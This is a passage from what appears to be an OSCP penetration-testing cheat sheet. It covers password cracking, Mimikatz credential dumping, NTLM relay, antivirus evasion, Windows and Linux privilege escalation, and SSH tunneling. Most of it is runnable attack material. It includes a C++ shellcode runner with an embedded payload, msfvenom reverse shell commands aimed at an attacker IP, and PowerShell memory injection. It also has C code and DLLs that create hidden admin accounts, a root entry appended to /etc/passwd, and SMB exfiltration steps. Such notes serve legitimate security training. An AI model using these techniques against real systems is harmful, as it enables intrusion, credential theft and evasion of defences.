hashcat -r demo.rule --stdout wordlist.txt

## Create Rule - John Examle
echo "[List.Rules:sshRules]\nc" > demo.rule
cat demo.rule >> /etc/john/john.conf
```

#### Password Manager

***Locating KeePass Database***

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

***Crack KeePass Database***

```bash
ls -la Database.kdbx

keepass2john Database.kdbx > keepass.hash

hashcat -m 13400 keepass.hash [rockyou] -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

#### SSH Private Key Passphrase

```markdown
## Connect through SSH
ssh -i id_rsa -p [port] [user]@[IP]

## Crack id_rsa if Password is prompted for that file
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=[wordlist] --rules=sshRules
```

### **Working with Password Hashes**

#### NTLM / NetNTLMv2

***Mimikatz***

```powershell
.\mimikatz.exe

privilege::debug
token::elevate

lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords

Import-Module Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command 'privilege::debug token::elevate'
```

***Capture Net-NTLMv2***

```bash
Responder -I [interface]

PS > ls \\[IP]\share
```

***Relaying Net-NTLMv2***

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t [IP] -c "CMD"
```

#### ***Windows Credential Guard***

<aside>
💡

Credential Guard Mitigation restrict access to ***LSASS.exe*** process. Domain/Remote user hashes aren’t accessible while the Local users are.

</aside>

<aside>
💡

Microsoft provides quite a few [*authentication mechanisms](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))* as part of the Windows operating system such as *Local Security Authority (LSA) Authentication*, *Winlogon*, *Security Support Provider Interfaces (SSPI)*, etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.

By default, Windows provides several *Security Support Providers (SSP)* such as *Kerberos Security Support Provider*, *NTLM Security Support Provider*, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

Additionally the SSP can also be registered through the *HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages* registry key. Each time the system starts up, the *Local Security Authority* (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with *LSASS*, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

</aside>

***Abuse SSP Authentication to Bypass Device Protection Mitigation***

```powershell
./mimikatz.exe
privilege::debug

misc::memssp

## At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.

## Check the Dump Credentials
type C:\Windows\System32\mimilsa.log
```

---

## **Antivirus Evasion**

***AV Engines:***

- File Engine
- Memory Engine
- Network Engine
- Disassembler
- Emulator/Sandbox
- Browser Plugin
- Machine Learning Engine

***Detection Methods***

- Signature-based Detection
- Heuristic-based Detection
- Behavioral Detection
- Machine Learning Detection

### **Bypassing Antivirus Detections**

#### **On-Disk Evasion**

> Modern on-disk malware obfuscation can take many forms. One of the earliest ways of avoiding detection involved the use of [*packers*](https://en.wikipedia.org/wiki/Executable_compression). Given the high cost of disk space and slow network speeds during the early days of the internet, packers were originally designed to reduce the size of an executable. Unlike modern "zip" compression techniques, packers generate an executable that is not only smaller but is also functionally equivalent with a completely new binary structure. The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners. Even though
some modern malware uses a variation of this technique, the use of [*UPX*](https://upx.github.io/) and other popular packers alone is not sufficient to evade modern AV scanners.
> 

> *Obfuscators* reorganize and mutate code in a way that makes it more difficult to reverse-engineer. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions or [*dead code*](https://en.wikipedia.org/wiki/Dead_code), splitting or reordering functions, and so on. Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection. Modern obfuscators also have runtime in-memory capabilities, which aims to hinder AV detection even further.
> 

> *Crypter* software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution. This decryption happens in-memory, leaving only the encrypted code on-disk. Encryption has become foundational in modern malware as one of the most effective AV evasion techniques.
> 

> Highly effective antivirus evasion requires a combination of all the previous techniques in addition to other advanced ones, including *anti-reversing*, *anti-debugging*, *virtual machine emulation detection*, and so on. In most cases, *software protectors* were designed for legitimate purposes, like *anti-copy*, but can also be used to bypass AV detection.
> 

> Most of these techniques may appear simple at a high-level but they can be quite complex. Because of this, there are currently few actively maintained free tools that provide acceptable antivirus evasion. Among commercially available tools, [*The Enigma Protector*](http://www.enigmaprotector.com/en/home.html) can be used to successfully bypass antivirus products.
> 

#### **In-Memory Evasion**

> The first technique we are going to cover is *Remote Process Memory Injection*, which attempts to inject the payload into another valid PE that is not malicious. The most common method of doing this is by leveraging a set of [*Windows APIs*](https://en.wikipedia.org/wiki/Windows_API). First, we would use the [*OpenProcess](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)* function to obtain a valid [*HANDLE](https://en.wikipedia.org/wiki/Handle_(computing))* to a target process that we have permission to access. After obtaining the HANDLE, we would allocate memory in the context of that process by calling a Windows API such as [*VirtualAllocEx*](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex). Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using [*WriteProcessMemory*](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory). After the payload has been successfully copied, it is usually executed in memory in a separate thread using the [*CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread)* API.
> 

> Unlike regular *DLL injection*, which involves loading a malicious DLL from disk using the [*LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)* API, the [*Reflective DLL Injection](https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/)* technique attempts to load a DLL stored by the attacker in the process memory.
> 
> 
> The main challenge of implementing this technique is that *LoadLibrary* does not support loading a DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write
> their own version of the API that does not rely on a disk-based DLL.
> 

> The third technique we want to mention is [*Process Hollowing*](https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations). When using process hollowing to bypass antivirus software, attackers first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed, and malicious code is executed instead of the legitimate process.
> 

> Ultimately, *Inline hooking*, as the name suggests, involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return to the modified function and resume execution, appearing as if only the original code had executed.
> 

### **AV Evasion in Practice**

#### **Testing for AV Evasion**

***Disable Sample Submission***

*Windows Security* >  *Virus & threat protection* > *Manage Settings* and deselecting

***Scanning without share to third-parties***

[Kleenscan.com](https://kleenscan.com/index)

#### AD Evasion - Custom Binaries

```cpp
#include "windows.h"

int main()
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78"
		"\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e"
		"\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09"
		"\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3"
		"\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff"
		"\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d"
		"\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8"
		"\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69"
		"\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1"
		"\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e"
		"\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f"
		"\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa"
		"\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e"
		"\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2"
		"\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5"
		"\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3"
		"\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61"
		"\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b"
		"\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2"
		"\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63"
		"\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6"
		"\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55"
		"\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec"
		"\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b"
		"\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d"
		"\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b"
		"\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2"
		"\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68"
		"\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8"
		"\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61"
		"\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad"
		"\x94\x64\x5d\xae\x2b\x90\xe1\xec";

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}
```

***Generate Shellcode***

```bash
## 32bit
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -e x86/shikata_ga_nai -b '\x00' -i 3 -f c 

## 64bit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
```

***Generate 32 /64 bit Executables***

```bash
i686-w64-mingw32-gcc exploit.cpp -o output.exe

x86_64-w64-mingw32-gcc exploit.cpp -o output.exe
```

#### **AD Evasion - Memory Injection**

***Basic Memory Injection Code***

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```

***Generate PowerShell Memory Injection Payload***

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f psh-reflection
```

***Full Basic Memory Injection Code***

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

function xf {
        Param ($nfCl, $vf)
        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
}

function xb {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
                [Parameter(Position = 1)] [Type] $hh = [Void]
        )
...
```

***Run the Malicious Script***

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

./malicious.ps1
```

***Run the DLL/EXE in memory using a* ReflectivePEInjection.ps1 ****

```powershell
## Your base64 encoded binary
 
$InputString = '...........'
 
function Invoke-ReflectivePEInjection
 
{
 
   ......
   ......
   ......
 
}
 
## Convert base64 string to byte array
 
$PEBytes = [System.Convert]::FromBase64String($InputString)
 
## Run EXE in memory
 
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
```

[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

### **Automating the Process**

***Install [Shellter](https://www.shellterproject.com/)*** 

```bash
apt-cache search shellter
sudo apt install shellter

## Since Shellter is designed to be run on Windows operating systems, install wine
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32

## Insall Wine on ARM based system
sudo apt install wine
sudo dpkg --add-architecture amd64
sudo  apt install -y qemu-user-static binfmt-support
sudo apt-get update && apt-get install wine32
```

<aside>
💡

For real engagements, it is best practice to pick a new, less scrutinized application as Shellter's [author explains](https://www.shellterproject.com/an-important-tip-for-shellter-usage/).

</aside>

***Veil Framework***

[https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

***Advanced Techniques to Bypass AV detection***

[web.archive.org](https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)

***FunFisher Malware Analysis***

[FinFisher exposed: A researcher’s tale of defeating traps, tricks, and complex virtual machines | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)

***AD Evasion Resources***

[AV Bypass with Metasploit Templates and Custom Binaries | Red Team Notes](https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates)

---

## **Windows Privilege Escalation**

### **Enumerating Windows**

#### **Understanding Windows Privileges and Access Control Mechanisms**

***Well-known SID’s***

```bash
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

From Windows Vista onward, processes run on five [*integrity levels*](https://msdn.microsoft.com/en-us/library/bb625963.aspx):

- System – Highly trusted user-mode system processes (e.g., `Winlogon`, `LSASS`)
- High – For elevated processes running with admin privileges
- Medium – For standard user processes (default)
- Low – For sandboxed or restricted processes (e.g., browsers)
- Untrusted – Rarely used; for highly restricted unverified sources

#### **Situational Awareness**

***There are several key pieces of information we should always obtain:***

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

***Groups/Users enumeration***

```markdown
## Group membership of the user
whoami /groups
net user [user]

## List of local users
Get-LocalUser
net user

## List of local groups
Get-LocalGroup
net localgroup

## List member of local groups
Get-LocalGroupMember [group]
net localgroup [group]
```

***System Information***

```powershell
systeminfo
```

***Network Information***

```markdown
## Network interfaces
ipconfig /all

## Display routing table
route print

## list of all active network connections 
netstat -ano
```

***List 32bit Applications***

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

***List 64bit Applications***

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

<aside>
💡

we should always check 32-bit and 64-bit **Program Files** directories located in **C:\**.
Additionally, we should review the contents of the **Downloads** directory of our user to find more potential programs.

</aside>

***List running Applications/Processes***

```powershell
Get-ProGet-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displaynamecess
```

#### **Hidden in Plain View**

***Search KeePass Database***

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

***Search sensitive information of XAMPP***

```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

***Search documents and text files in the Home directory***

```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.csv,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

***RunAs Command - Only if GUI access***

```powershell
runas /user:[user] cmd
```

#### **Information Goldmine PowerShell**

***PowerShell - Get History***

```powershell
Get-History
```

***PowerShell - Get PSReadLine Path***

```powershell
(Get-PSReadlineOption).HistorySavePath
```

***PowerShell - Enter-PSSession***

```powershell
$password = ConvertTo-SecureString "password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("user", $password)

Enter-PSSession -ComputerName [hostname] -Credential $cred
```

***Search events recorded by Script Block Logging***

```markdown
## Open Event Viewer
## Navigate to Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
## Filter for Script Block Logging events to 4104 ID
## View events. Note ScriptBlockText parameter where executed scripts are stored
```

**Dumping Hashes from SAM via Registry**

```powershell
reg save hklm\system system
reg save hklm\sam sam
```

**Exfiltrate Data From Windows**

```powershell
## Kali 
impacket-smbserver share . -smb2support -username user -password password

## Windows

net use m: \\[IP]\share /user:user password
copy data m:\
```

#### **Automated Enumeration**

[PEASS-ng/winPEAS at master · peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

[https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

[https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)

### **Leveraging Windows Services**

#### **Service Binary Hijacking**

***List Running Services***

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

***Check Permissions of Vulnerable Service Binary***

```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

***Icacls Permissions***

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

***Abuse the Vulnerable Service Binary - C code example***

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

***Abuse the Vulnerable Service Binary - Generate PE***

```bash
x86_64-w64-mingw32-gcc code.c -o malicious.exe
```

***Check Vulnerable Service Startup Type***

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

***Restart the Service***

```powershell
net stop [service]
net start [service]

Start-Service [service]
Stop-Service [service]

shutdown /r /t 0
```

***Abuse the Vulnerable Service Binary - Automated tool***

```powershell
Set-ExecutionPolicy Unrestricted -Scope currentUser
import-module .\PowerUp.ps1

Get-ModifiableServiceFile
```

#### **DLL Hijacking**

```markdown
## Process Explorer
https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer

## Process Monitor
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

## list of Vulnerable Applications
https://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/

When a program is launched, the DLL Search Order in most cases is as follows:

1.The directory from which the application was launched
2.The `C:\Windows\System32` directory
3.The 16-bit Windows system directory (i.e, `C:\windows\system`)
4.The Windows directory (`C:\windows`)
5.The current directory at the time of execution
6.Any directories specified by the %PATH% environment variable

Process Explorer - Identify file PATH and associated services  

Process Monitor - Apply filters to check what DLL are loaded.

Services - Stop and start services to display dll processes on Process Monitor

## Run Process Monitor with following filters
Process      > is       >  [process]
Operation    > contains >  CreateFile
Result       > contains >  NAME NOT FOUND
Path         > end with >  .dll
```

***Create Malicious DLL with MSFVenom***

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll -o injection.dll
```

***Create Malicious DLL with C++ Code***

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

***Generate Executable DLL***

```bash
x86_64-w64-mingw32-gcc Malicious.cpp --shared -o injection.dll
```

#### **Unquoted Service Paths**

***Enumerate running and stopped services.***

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

***Check directory permissions***

```powershell
icacls "C:\PATH"
```

***Restart the Service***

```bash
net stop [service]
net start [service]

Start-Service [service]
Stop-Service [service]

shutdown /r /t 0
```

***Automated tool***

```powershell
Set-ExecutionPolicy Unrestricted -Scope currentUser
import-module .\PowerUp.ps1

Get-UnquotedService
Invoke-AllChecks
```

***Abuse the Service*** 

```powershell
## https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/

## With PowerUp - Invoke-ServiceAbuse
import-module .\PowerUp.ps1
Get-UnquotedService
Invoke-AllChecks

Invoke-ServiceAbuse -Name VulnSVC 
Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."
Invoke-ServiceAbuse -Name VulnSVC -Command "C:\\tmp\\payload.exe"

## Manual - Change Executable with the MSFVenom generatet payloiad

msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST] LPORT=]LPORT] -f exe -o [VulnService.exe]

```

### **Abusing Other Windows Components**

#### **Scheduled Tasks**

***Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:***

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

***Enumerate Scheduled Tasks***

```powershell
Get-ScheduledTask
```

```powershell
schtasks /query /fo LIST /v
```

***Enumerate scheduled tasks run by user***

```powershell
schtasks /query /fo LIST /v | 
    ForEach-Object -Begin { $block = @() } `
                   -Process {
                       if ($_ -eq "") {
                           if ($block -match "Run As User:\s+daveadmin") {
                               $block -join "`n"
                               "`n" + ("-"*80) + "`n"
                           }
                           $block = @()
                       } else {
                           $block += $_
                       }
                   }
```

#### **Using Exploits**

***Kernel Exploits***

```powershell
systeminfo

## Installed Security Patches
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

***Abuse SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege - Potato Vulnerabilities***

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

[GitHub - tylerdotrar/SigmaPotato: SeImpersonate privilege escalation tool for Windows 8 - 11 and Windows Server 2012 - 2022 with extensive PowerShell and .NET reflection support.](https://github.com/tylerdotrar/SigmaPotato?tab=readme-ov-file)

[Jorge Lajara Website](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

<aside>
💡

Other privileges that may lead to privilege escalation are ***SeBackupPrivilege***, ***SeAssignPrimaryToken***, ***SeLoadDriver***, and ***SeDebug***.

</aside>

---

## **Linux Privilege Escalation**

### **Enumerating Linux**

**Manual Enumeration**

```markdown
## Enumerate OS/Kernel
cat /etc/issue
cat /etc/*-release
uname -a

## List system processes
ps aux

## List all connections
netstat -antp

## Firewall rules
cat /etc/iptables/rules.v4

## Cron jobs - Task Scheduler
ls -lah /etc/cron*
crontab -l
sudo crontab -l

## Check the filesystem for installed cron jobs
grep "CRON" /var/log/syslog

## Find directory/word writable by the current user
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

## Lists all drives that will be mounted at boot time
cat /etc/fstab

## List all mounted filesystems
mount

## List all available disks
lsblk

## List loaded kernel modules
lsmod
/sbin/modinfo [moduleName]

## Search for SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

```

**Automated Enumeration**

[unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

[PEASS-ng/linPEAS at master · peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

### **Exposed Confidential Information**

***Inspecting User Trails***

```markdown
## Environment variables
env

## .bashrc configuration file
cat .bashrc

## Generate custom wordlist
crunch 6 6 -t Lab%%% > wordlist

## SSH brute force
hydra -l [user] -P [wordlist]  [ip] -t 4 ssh -V
```

***Inspecting Service Footprints***

```markdown
## Enumerate all the running processes that contains "pass"
watch -n 1 ps -aux | grep "pass"

## Capture traffic in and out of the loopback interface that contains "pass"
sudo tcpdump -i lo -A | grep "pass"
```

### **Insecure File Permissions**

***Abusing Cron Jobs***

```markdown
 # Check the filesystem for installed cron jobs
grep "CRON" /var/log/syslog

## List all cron jobs
ls -lah /etc/cron*

## List current user cron jobs
crontab -l
sudo crontab -l
```

***Abusing Password Authentication - Word-Writable /etc/passwd***

```markdown
## Locate writable files
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

## Generate password 'w00t'
openssl passwd w00t

## Add superuser (root2)
echo "root2:<GeneratedPassword>:0:0:root:/root:/bin/bash" >> /etc/passwd

## Authenticate as newly created superuser
su root2 (Pass: w00t)
```

### **Insecure System Components**

***Abusing Setuid Binaries and Capabilities***

```markdown

## Search for SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

## Search linux capabilities
/usr/sbin/getcap -r / 2>/dev/null
```

***Exploiting Kernel Vulnerabilities***

```markdown
## Enumerate OS
cat /etc/issue

## Enumerate kernel
uname -r

## Enumerate architecture
arch

## Assume that target is Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

***Linux Privilege Escalation References:***

[Linux - Privilege Escalation - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)

[Linux Privilege Escalation - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

[apt get
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/)

[Basic Linux Privilege Escalation - g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

---

## **Port Redirection and SSH Tunneling**

### **Port Forwarding with Linux Tools**

#### **Port Forwarding with Socat**

***Forward 2345 port to 5432 postgresql***

```bash
socat TCP-LISTEN:2345,fork TCP:10.10.10.10:5432
```

![image.png](OSCP%20CheatSheet/image%201.png)

***Forward 2222 port to 22 SSH***

```bash
socat TCP-LISTEN:2222,fork TCP:10.10.10.10:22
```

![image.png](OSCP%20CheatSheet/image%202.png)

### **SSH Tunneling**

#### **SSH Local Port Forwarding**

***SSH Port Forwarding***

```bash
ssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [user]@[IP]

## Example
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

![image.png](OSCP%20CheatSheet/image%203.png)

***Find open ports without scanning tools***

```bash
for i in $(seq 1 254); do nc -zv -w 1 10.10.10.$i 445; done
```

***Connect forwarded SMB port with smbmap***

```bash
smbclient -p [port]  -L //[IP] --user [user] --password [pass]

smbclient -p [port]  //[IP]/[share] --user [user] --password [pass]
```

#### **SSH Dynamic Port Forwarding**

***SSH Dynamic Port Forwarding***

```bash
ssh -N -D [LOCAL_IP:]LOCAL_PORT] [user]@[IP]

## Example
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

## Modify proxychains4.conf
echo "socks5 [IP] [PORT]" >> /etc/proxychains4.conf

```

![image.png](OSCP%20CheatSheet/image%204.png)

#### **SSH Remote Port Forwarding**

***SSH Remote Port Forwarding***

```bash
## Kali - Attacker VM
sudo systemctl start ssh
sudo ss -ntplu

## Remote VM
ssh -N -R LOCAL_IP:LOCAL_PORT:DEST_IP:DEST_PORT [user]@[KALI_IP]

## Example
